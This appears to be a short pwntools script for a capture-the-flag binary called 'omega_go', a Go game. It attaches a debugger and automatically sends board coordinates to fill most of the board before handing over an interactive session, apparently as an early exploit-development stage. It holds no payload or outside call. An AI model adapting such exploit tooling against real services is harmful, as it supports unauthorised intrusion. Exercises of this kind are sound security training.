from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

p = process("./omega_go")
gdb.attach(p)

DEBUG = True

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def s(msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

for row in range(9):
    for i in range(19):
        for j in range(22):
            r("\n")

        (s(chr(i + 0x41) + str(row + 1)))

for i in range(9):
    for j in range(22):
        r("\n")
    (s(chr(i + 0x41) + str(10)))

p.interactive()
p.close()
